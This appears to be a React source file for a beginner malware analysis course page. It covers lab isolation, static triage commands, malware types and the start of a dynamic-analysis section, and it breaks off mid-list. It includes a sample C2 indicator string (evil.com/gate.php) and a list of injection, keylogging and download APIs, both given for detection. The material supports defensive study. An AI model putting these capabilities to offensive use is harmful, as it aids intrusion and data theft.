                { step: "4", title: "Code Analysis", desc: "Disassembly, debugging, understand logic", color: "#ec4899" },
                { step: "5", title: "Memory Analysis", desc: "Dump memory, find injected code, extract configs", color: "#f97316" },
                { step: "6", title: "Reporting", desc: "Document IOCs, behaviors, MITRE mapping", color: "#10b981" },
              ].map((item) => (
                <Grid item xs={12} sm={6} md={4} key={item.step}>
                  <Paper
                    sx={{
                      p: 2,
                      height: "100%",
                      borderRadius: 2,
                      bgcolor: alpha(item.color, 0.05),
                      border: `1px solid ${alpha(item.color, 0.2)}`,
                    }}
                  >
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 1 }}>
                      <Box
                        sx={{
                          width: 32,
                          height: 32,
                          borderRadius: "50%",
                          bgcolor: item.color,
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Typography variant="body2" sx={{ fontWeight: 800, color: "white" }}>
                          {item.step}
                        </Typography>
                      </Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: item.color }}>
                        {item.title}
                      </Typography>
                    </Box>
                    <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.6 }}>
                      {item.desc}
                    </Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>
          </Paper>

          <Divider sx={{ my: 4 }} />

          <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: "#ef4444" }}>
            Essential Tools for Beginners
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            You don't need expensive tools to get started. Many of the best malware analysis tools are free and 
            open-source. Here's a starter toolkit:
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { name: "strings / FLOSS", category: "String Extraction", desc: "Extract readable text from binaries", free: true },
              { name: "PE-bear / CFF Explorer", category: "PE Analysis", desc: "Examine Windows executable headers", free: true },
              { name: "Ghidra", category: "Disassembler", desc: "NSA's free reverse engineering suite", free: true },
              { name: "x64dbg", category: "Debugger", desc: "Open-source Windows debugger", free: true },
              { name: "Process Monitor", category: "Behavior Monitor", desc: "Track file/registry/network activity", free: true },
              { name: "Wireshark", category: "Network Capture", desc: "Analyze malware network traffic", free: true },
              { name: "VirusTotal", category: "Online Scanning", desc: "Check samples against 70+ AV engines", free: true },
              { name: "ANY.RUN / Hybrid Analysis", category: "Online Sandbox", desc: "Run malware safely in the cloud", free: true },
            ].map((tool, idx) => (
              <Grid item xs={12} sm={6} md={3} key={idx}>
                <Paper
                  sx={{
                    p: 2,
                    height: "100%",
                    borderRadius: 2,
                    bgcolor: alpha(theme.palette.background.paper, 0.8),
                    border: `1px solid ${alpha(theme.palette.divider, 0.15)}`,
                  }}
                >
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 0.5 }}>
                    {tool.name}
                  </Typography>
                  <Chip 
                    label={tool.category} 
                    size="small" 
                    sx={{ fontSize: "0.65rem", mb: 1, bgcolor: alpha("#ef4444", 0.1), color: "#ef4444" }} 
                  />
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.8rem" }}>
                    {tool.desc}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Divider sx={{ my: 4 }} />

          <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: "#f97316" }}>
            Common Challenges & Anti-Analysis Techniques
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            Malware authors don't make it easy for analysts. They use various techniques to hide their code, 
            detect analysis environments, and frustrate investigation:
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { name: "Packing/Compression", desc: "Code is compressed or encrypted, only unpacked at runtime", icon: <LockIcon /> },
              { name: "Obfuscation", desc: "Code is deliberately confusing with junk instructions and dead code", icon: <VisibilityIcon /> },
              { name: "Anti-Debugging", desc: "Detects debuggers and changes behavior or crashes", icon: <BugReportIcon /> },
              { name: "Anti-VM", desc: "Detects virtual machines via hardware, timing, or registry checks", icon: <StorageIcon /> },
              { name: "String Encryption", desc: "Strings are encrypted and decrypted only when needed", icon: <VpnKeyIcon /> },
              { name: "Code Injection", desc: "Injects malicious code into legitimate processes", icon: <DataObjectIcon /> },
            ].map((tech, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper
                  sx={{
                    p: 2,
                    borderRadius: 2,
                    bgcolor: alpha("#f97316", 0.03),
                    border: `1px solid ${alpha("#f97316", 0.15)}`,
                  }}
                >
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 1 }}>
                    <Box sx={{ color: "#f97316" }}>{tech.icon}</Box>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
                      {tech.name}
                    </Typography>
                  </Box>
                  <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem" }}>
                    {tech.desc}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="success" sx={{ mb: 3, borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Ready to Begin?</AlertTitle>
            <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
              This page will guide you through all aspects of malware analysis, from basic file identification 
              to advanced debugging and memory forensics. Each section below covers a specific topicstart from 
              the top and work your way down. Set up your isolated lab environment first, then practice with 
              beginner-friendly samples from sites like MalwareBazaar or theZoo (educational malware repository).
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION OUTLINE ==================== */}
        <Typography 
          variant="h4" 
          sx={{ 
            fontWeight: 800, 
            mb: 4, 
            display: "flex", 
            alignItems: "center", 
            gap: 2,
            scrollMarginTop: 96,
          }}
          id="topics"
        >
          <AccountTreeIcon sx={{ color: "#ef4444", fontSize: 36 }} />
          Course Outline
        </Typography>

        <Typography variant="body1" color="text.secondary" sx={{ mb: 4, maxWidth: 800 }}>
          This comprehensive guide covers everything from malware fundamentals to advanced analysis techniques. 
          Sections marked "Coming Soon" will be expanded with detailed content, code examples, and hands-on exercises.
        </Typography>

        <Grid container spacing={3} sx={{ mb: 6 }}>
          {outlineSections.map((section, index) => (
            <Grid item xs={12} sm={6} md={4} key={section.id}>
              <Paper
                id={section.id}
                sx={{
                  p: 3,
                  height: "100%",
                  borderRadius: 3,
                  bgcolor: alpha(section.color, 0.03),
                  border: `2px solid ${alpha(section.color, 0.15)}`,
                  transition: "all 0.3s ease",
                  scrollMarginTop: 96,
                  "&:hover": {
                    transform: "translateY(-4px)",
                    boxShadow: `0 8px 24px ${alpha(section.color, 0.2)}`,
                    borderColor: alpha(section.color, 0.4),
                  },
                }}
              >
                <Box sx={{ display: "flex", alignItems: "flex-start", gap: 2, mb: 2 }}>
                  <Box
                    sx={{
                      width: 48,
                      height: 48,
                      borderRadius: 2,
                      bgcolor: alpha(section.color, 0.15),
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      color: section.color,
                      flexShrink: 0,
                    }}
                  >
                    {section.icon}
                  </Box>
                  <Box sx={{ flex: 1 }}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 0.5 }}>
                      <Chip 
                        label={`${index + 1}`}
                        size="small"
                        sx={{ 
                          minWidth: 28,
                          height: 22,
                          fontSize: "0.7rem",
                          fontWeight: 800,
                          bgcolor: section.color,
                          color: "white",
                        }}
                      />
                      <Chip 
                        label={section.status}
                        size="small"
                        icon={section.status === "Complete" ? <CheckCircleIcon /> : <RadioButtonUncheckedIcon />}
                        sx={{ 
                          fontSize: "0.65rem",
                          height: 22,
                          bgcolor: section.status === "Complete" 
                            ? alpha("#22c55e", 0.15) 
                            : alpha("#f59e0b", 0.15),
                          color: section.status === "Complete" ? "#22c55e" : "#f59e0b",
                          "& .MuiChip-icon": { 
                            fontSize: 14,
                            color: section.status === "Complete" ? "#22c55e" : "#f59e0b",
                          },
                        }}
                      />
                    </Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, lineHeight: 1.3 }}>
                      {section.title}
                    </Typography>
                  </Box>
                </Box>
                <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.6 }}>
                  {section.description}
                </Typography>
              </Paper>
            </Grid>
          ))}
        </Grid>

        {/* ==================== SECTION 1: MALWARE TYPES & CLASSIFICATION ==================== */}
        <Paper
          id="malware-types-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#ef4444", 0.02),
            border: `1px solid ${alpha("#ef4444", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#ef4444", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#ef4444",
              }}
            >
              <BugReportIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#ef4444" }}>
                1. Malware Types & Classification
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Understanding the different types of malware is fundamental to analysis. Each category has distinct 
            behaviors, propagation methods, and objectives. Recognizing these patterns helps you quickly 
            identify what you're dealing with and guides your analysis approach.
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            {[
              {
                name: "Virus",
                icon: "",
                color: "#ef4444",
                desc: "Self-replicating code that attaches to legitimate files",
                behavior: "Infects executables, documents, or boot sectors",
                propagation: "Requires user action to spread (running infected files)",
                examples: "CIH, Melissa, ILOVEYOU",
                detection: "File hash changes, code caves, entry point modifications",
              },
              {
                name: "Worm",
                icon: "",
                color: "#f97316",
                desc: "Self-propagating malware that spreads without user interaction",
                behavior: "Exploits network vulnerabilities to spread autonomously",
                propagation: "Network-based, no host file required",
                examples: "Conficker, WannaCry, Slammer, Code Red",
                detection: "Network scanning, unusual traffic patterns, exploitation attempts",
              },
              {
                name: "Trojan",
                icon: "",
                color: "#8b5cf6",
                desc: "Disguised as legitimate software to trick users",
                behavior: "Provides backdoor access, steals data, or downloads more malware",
                propagation: "Social engineering, fake downloads, malicious attachments",
                examples: "Emotet, Zeus, RATs (Remote Access Trojans)",
                detection: "Suspicious imports, hidden functionality, network callbacks",
              },
              {
                name: "Ransomware",
                icon: "",
                color: "#dc2626",
                desc: "Encrypts files and demands payment for decryption",
                behavior: "File encryption, ransom note display, payment instructions",
                propagation: "Phishing, exploit kits, RDP compromise",
                examples: "WannaCry, Ryuk, LockBit, REvil, Conti",
                detection: "Crypto APIs, file enumeration, extension changes",
              },
              {
                name: "Rootkit",
                icon: "",
                color: "#6366f1",
                desc: "Hides malware presence by modifying OS components",
                behavior: "Kernel hooks, process hiding, file/registry concealment",
                propagation: "Often delivered by other malware for persistence",
                examples: "TDL4, ZeroAccess, Necurs",
                detection: "Kernel integrity checks, memory forensics, behavioral anomalies",
              },
              {
                name: "Spyware/Keylogger",
                icon: "",
                color: "#06b6d4",
                desc: "Secretly monitors user activity and steals information",
                behavior: "Keylogging, screenshot capture, clipboard monitoring",
                propagation: "Bundled software, phishing, drive-by downloads",
                examples: "FinFisher, Pegasus, Agent Tesla",
                detection: "Hook APIs, screen capture functions, input monitoring",
              },
              {
                name: "Botnet Agent",
                icon: "",
                color: "#10b981",
                desc: "Turns infected machines into remotely controlled bots",
                behavior: "C2 communication, command execution, DDoS participation",
                propagation: "Worm functionality, exploit kits, spam campaigns",
                examples: "Mirai, Necurs, TrickBot, Emotet",
                detection: "C2 beaconing, DGA domains, IRC/HTTP callbacks",
              },
              {
                name: "Dropper/Loader",
                icon: "",
                color: "#f59e0b",
                desc: "Delivers and installs other malware payloads",
                behavior: "Downloads or extracts embedded malware, establishes persistence",
                propagation: "Email attachments, malicious macros, exploit chains",
                examples: "Emotet loader, BazarLoader, IcedID",
                detection: "Resource extraction, process injection, download URLs",
              },
            ].map((malware, idx) => (
              <Grid item xs={12} md={6} key={idx}>
                <Paper
                  sx={{
                    p: 2.5,
                    height: "100%",
                    borderRadius: 2,
                    bgcolor: alpha(malware.color, 0.03),
                    border: `1px solid ${alpha(malware.color, 0.15)}`,
                  }}
                >
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 2 }}>
                    <Typography variant="h5">{malware.icon}</Typography>
                    <Typography variant="h6" sx={{ fontWeight: 700, color: malware.color }}>
                      {malware.name}
                    </Typography>
                  </Box>
                  <Typography variant="body2" sx={{ mb: 1.5, fontWeight: 600 }}>
                    {malware.desc}
                  </Typography>
                  <Box sx={{ fontSize: "0.8rem", color: "text.secondary" }}>
                    <Typography variant="body2" sx={{ mb: 0.5 }}>
                      <strong>Behavior:</strong> {malware.behavior}
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 0.5 }}>
                      <strong>Spread:</strong> {malware.propagation}
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 0.5 }}>
                      <strong>Examples:</strong> {malware.examples}
                    </Typography>
                    <Typography variant="body2">
                      <strong>Detection:</strong> {malware.detection}
                    </Typography>
                  </Box>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Classification is Often Blurred</AlertTitle>
            <Typography variant="body2">
              Modern malware often combines multiple categories. For example, Emotet started as a banking trojan, 
              evolved into a botnet, and became primarily a dropper/loader for other malware. WannaCry combined 
              ransomware with worm capabilities. Focus on understanding the behaviors rather than rigid categories.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 2: ANALYSIS ENVIRONMENT ==================== */}
        <Paper
          id="analysis-environment-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#8b5cf6", 0.02),
            border: `1px solid ${alpha("#8b5cf6", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#8b5cf6", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#8b5cf6",
              }}
            >
              <SettingsIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#8b5cf6" }}>
                2. Setting Up an Analysis Environment
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Alert severity="error" sx={{ mb: 3, borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}> Critical Safety Rule</AlertTitle>
            <Typography variant="body2">
              <strong>NEVER analyze malware on your personal computer or production network.</strong> Malware can 
              steal credentials, encrypt files, spread to other machines, or persist in ways that survive OS reinstallation. 
              Always use an isolated virtual environment that you can destroy and rebuild.
            </Typography>
          </Alert>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
            Essential Components
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            <Grid item xs={12} md={6}>
              <Paper sx={{ p: 3, height: "100%", borderRadius: 2, bgcolor: alpha("#8b5cf6", 0.03), border: `1px solid ${alpha("#8b5cf6", 0.1)}` }}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                  <StorageIcon sx={{ color: "#8b5cf6" }} /> Hypervisor Options
                </Typography>
                <List dense>
                  {[
                    { name: "VMware Workstation Pro", desc: "Gold standard, best snapshot support, commercial" },
                    { name: "VMware Workstation Player", desc: "Free for personal use, limited features" },
                    { name: "VirtualBox", desc: "Free, open-source, good for beginners" },
                    { name: "Hyper-V", desc: "Built into Windows Pro, requires host setup" },
                    { name: "QEMU/KVM", desc: "Linux-native, excellent for automation" },
                  ].map((item, idx) => (
                    <ListItem key={idx} sx={{ py: 0.5 }}>
                      <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e", fontSize: 18 }} /></ListItemIcon>
                      <ListItemText 
                        primary={<Typography variant="body2" sx={{ fontWeight: 600 }}>{item.name}</Typography>}
                        secondary={item.desc}
                      />
                    </ListItem>
                  ))}
                </List>
              </Paper>
            </Grid>
            <Grid item xs={12} md={6}>
              <Paper sx={{ p: 3, height: "100%", borderRadius: 2, bgcolor: alpha("#8b5cf6", 0.03), border: `1px solid ${alpha("#8b5cf6", 0.1)}` }}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                  <MemoryIcon sx={{ color: "#8b5cf6" }} /> Pre-Built Analysis VMs
                </Typography>
                <List dense>
                  {[
                    { name: "FlareVM (Windows)", desc: "Mandiant's Windows analysis toolkit, 140+ tools" },
                    { name: "REMnux (Linux)", desc: "SANS forensics distro, malware analysis focus" },
                    { name: "SIFT Workstation", desc: "SANS forensics & IR toolkit" },
                    { name: "Commando VM", desc: "Mandiant's offensive Windows VM" },
                    { name: "Tsurugi Linux", desc: "DFIR-focused Linux distribution" },
                  ].map((item, idx) => (
                    <ListItem key={idx} sx={{ py: 0.5 }}>
                      <ListItemIcon><CheckCircleIcon sx={{ color: "#22c55e", fontSize: 18 }} /></ListItemIcon>
                      <ListItemText 
                        primary={<Typography variant="body2" sx={{ fontWeight: 600 }}>{item.name}</Typography>}
                        secondary={item.desc}
                      />
                    </ListItem>
                  ))}
                </List>
              </Paper>
            </Grid>
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
            Network Isolation Configuration
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# VMware Network Settings for Malware Analysis

Option 1: Host-Only Networking (Recommended for most analysis)
- VM can only talk to host and other VMs on same network
- No internet access - safest option
- Use INetSim/FakeNet to simulate services

Option 2: Custom NAT with Filtering
- Internet access through controlled gateway
- Run REMnux as gateway with tcpdump/Wireshark
- Useful for C2 analysis (with caution!)

Option 3: Completely Isolated (Air-gapped)
- No network adapter at all
- Maximum safety for destructive samples
- Transfer files via virtual floppy/CD

# Recommended VM Configuration:
- Disable shared folders
- Disable drag-and-drop
- Disable clipboard sharing
- Remove USB controller (or disable passthrough)
- Take a clean snapshot before each analysis`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
            Fake Network Services
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { name: "INetSim", desc: "Linux-based, simulates 15+ services (HTTP, DNS, SMTP, FTP, etc.)", platform: "Linux" },
              { name: "FakeNet-NG", desc: "Windows/Linux, redirects all traffic, SSL interception", platform: "Cross-platform" },
              { name: "ApateDNS", desc: "Simple DNS redirection tool for Windows", platform: "Windows" },
              { name: "mitmproxy", desc: "Interactive HTTPS proxy for traffic inspection", platform: "Cross-platform" },
            ].map((tool, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#8b5cf6", 0.03), border: `1px solid ${alpha("#8b5cf6", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{tool.name}</Typography>
                  <Chip label={tool.platform} size="small" sx={{ fontSize: "0.65rem", mb: 1 }} />
                  <Typography variant="body2" color="text.secondary">{tool.desc}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="success" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Snapshot Workflow</AlertTitle>
            <Typography variant="body2">
              <strong>1.</strong> Set up a clean Windows VM with analysis tools installed<br />
              <strong>2.</strong> Create a "Clean" snapshot before any malware<br />
              <strong>3.</strong> Copy malware sample to VM<br />
              <strong>4.</strong> Create "Pre-Analysis" snapshot<br />
              <strong>5.</strong> Run analysis<br />
              <strong>6.</strong> Document findings<br />
              <strong>7.</strong> Revert to "Clean" snapshot for next sample
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 3: STATIC ANALYSIS ==================== */}
        <Paper
          id="static-analysis-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#3b82f6", 0.02),
            border: `1px solid ${alpha("#3b82f6", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#3b82f6", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#3b82f6",
              }}
            >
              <SearchIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#3b82f6" }}>
                3. Static Analysis Fundamentals
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Static analysis examines malware <strong>without executing it</strong>. This is the safest starting point 
            and can reveal file type, embedded strings, imported functions, compiler artifacts, and potential 
            capabilitiesall without risking infection.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            Step 1: Initial Triage
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Calculate file hashes (for identification & VirusTotal lookup)
md5sum malware.exe
sha256sum malware.exe
ssdeep malware.exe          # Fuzzy hash for similarity matching

# Identify file type (don't trust extensions!)
file malware.exe
# Output: PE32 executable (GUI) Intel 80386, for MS Windows

# Check entropy (high entropy = packed/encrypted)
ent malware.exe
# Entropy > 7.0 usually indicates packing

# Quick VirusTotal check (CLI)
vt file malware.exe          # Requires API key`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            Step 2: String Extraction
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Basic strings extraction
strings malware.exe | less

# FLOSS - FLARE Obfuscated String Solver (better!)
floss malware.exe

# What to look for in strings:
# - URLs, IP addresses, domains
# - Registry keys (HKLM, HKCU, CurrentVersion\\Run)
# - File paths (C:\\Windows, %APPDATA%)
# - API function names
# - Error messages, debug strings
# - Bitcoin addresses, email addresses
# - Base64 encoded data
# - Compiler/packer signatures

# Example interesting strings:
# "http://evil.com/gate.php"    <- C2 URL
# "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"  <- Persistence
# "cmd.exe /c"                  <- Command execution
# "VirtualAlloc"                <- Memory allocation (for unpacking)
# "IsDebuggerPresent"           <- Anti-debugging`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            Step 3: PE Header Analysis (Windows)
          </Typography>

          <Grid container spacing={3} sx={{ mb: 3 }}>
            <Grid item xs={12} md={6}>
              <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#3b82f6", 0.03), border: `1px solid ${alpha("#3b82f6", 0.1)}` }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>Key PE Header Fields</Typography>
                <List dense>
                  {[
                    { field: "TimeDateStamp", info: "Compilation time (often faked)" },
                    { field: "Subsystem", info: "GUI vs Console application" },
                    { field: "ImageBase", info: "Preferred load address" },
                    { field: "EntryPoint", info: "Where execution begins" },
                    { field: "NumberOfSections", info: "Code, data, resource sections" },
                    { field: "Characteristics", info: "DLL, executable, debug stripped" },
                  ].map((item, idx) => (
                    <ListItem key={idx} sx={{ py: 0.25 }}>
                      <ListItemText 
                        primary={<Typography variant="body2"><code>{item.field}</code></Typography>}
                        secondary={item.info}
                      />
                    </ListItem>
                  ))}
                </List>
              </Paper>
            </Grid>
            <Grid item xs={12} md={6}>
              <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha("#3b82f6", 0.03), border: `1px solid ${alpha("#3b82f6", 0.1)}` }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>Suspicious Section Names</Typography>
                <List dense>
                  {[
                    { name: "UPX0, UPX1", info: "UPX packer (common)" },
                    { name: ".ndata", info: "NSIS installer" },
                    { name: ".rsrc (large)", info: "Embedded payloads in resources" },
                    { name: "Random names", info: "Custom packers (abc, xyz, etc.)" },
                    { name: "High entropy sections", info: "Encrypted/compressed code" },
                    { name: "Executable .data", info: "Self-modifying code" },
                  ].map((item, idx) => (
                    <ListItem key={idx} sx={{ py: 0.25 }}>
                      <ListItemText 
                        primary={<Typography variant="body2"><code>{item.name}</code></Typography>}
                        secondary={item.info}
                      />
                    </ListItem>
                  ))}
                </List>
              </Paper>
            </Grid>
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
            Step 4: Import Table Analysis
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Suspicious API Imports by Category:

## Process Manipulation
CreateRemoteThread     # Code injection
VirtualAllocEx         # Allocate memory in another process
WriteProcessMemory     # Write to another process
NtUnmapViewOfSection   # Process hollowing

## Keylogging/Spying
GetAsyncKeyState       # Keylogging
SetWindowsHookEx       # Global hooks (keyboard, mouse)
GetClipboardData       # Clipboard stealing

## Anti-Analysis
IsDebuggerPresent      # Debugger detection
CheckRemoteDebugger    # Remote debugger detection
NtQueryInformationProcess  # Various anti-debug checks
GetTickCount           # Timing-based anti-analysis

## Network
InternetOpen           # WinINet networking
URLDownloadToFile      # Download from URL
WSAStartup             # Winsock initialization

## Persistence
RegSetValueEx          # Registry modification
CreateService          # Service creation
SetFileAttributes      # Hide files

## Crypto (Ransomware indicator)
CryptEncrypt           # Windows Crypto API
CryptGenKey            # Key generation
CryptAcquireContext    # Crypto context`}
            </Typography>
          </Paper>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Static Analysis Tools</AlertTitle>
            <Typography variant="body2">
              <strong>PE Analysis:</strong> PE-bear, CFF Explorer, pestudio, pefile (Python)<br />
              <strong>ELF Analysis:</strong> readelf, objdump, radare2, Ghidra<br />
              <strong>Multi-format:</strong> Detect It Easy (DIE), ExeinfoPE, Hiew<br />
              <strong>Online:</strong> VirusTotal, Hybrid Analysis (static view), PE Studio Online
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 4: DYNAMIC ANALYSIS ==================== */}
        <Paper
          id="dynamic-analysis-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#06b6d4", 0.02),
            border: `1px solid ${alpha("#06b6d4", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#06b6d4", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#06b6d4",
              }}
            >
              <PlayArrowIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#06b6d4" }}>
                4. Dynamic Analysis & Behavior Monitoring
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Dynamic analysis means <strong>executing the malware</strong> in a controlled environment and observing 
            its behavior. This reveals actual capabilities that might be hidden, encrypted, or obfuscated in 
            static analysis. Always use an isolated VM with network monitoring!
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
            Monitoring Tools & Techniques
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            {[
              {
                name: "Process Monitor (ProcMon)",
                category: "System Activity",
                color: "#06b6d4",
                desc: "Captures file system, registry, network, and process activity in real-time",
                tips: [
                  "Filter by process name immediately",
                  "Look for registry Run keys",
                  "Watch for file drops in Temp/AppData",
                  "Monitor CreateFile operations",
                ],
              },
              {
                name: "Process Explorer / Process Hacker",
                category: "Process Analysis",
                color: "#8b5cf6",
                desc: "Advanced task manager showing process trees, handles, DLLs, and network connections",
                tips: [
                  "Check for injected DLLs (purple highlighting)",
                  "View process command line arguments",
                  "Monitor TCP/IP connections per process",
                  "Identify parent-child process relationships",
                ],
              },
              {
                name: "Wireshark / tcpdump",
                category: "Network Capture",
                color: "#10b981",
                desc: "Capture all network traffic for C2 communication analysis",
                tips: [
                  "Filter by IP or protocol (http, dns, ssl)",
                  "Follow TCP streams to see full conversations",
                  "Extract downloaded files",
                  "Look for beaconing patterns",
                ],
              },
              {
                name: "Regshot",
                category: "Registry Changes",
                color: "#f97316",
                desc: "Takes snapshots of registry before/after and compares differences",
                tips: [
                  "Take 1st shot before running malware",
                  "Run malware, let it settle",
                  "Take 2nd shot and compare",
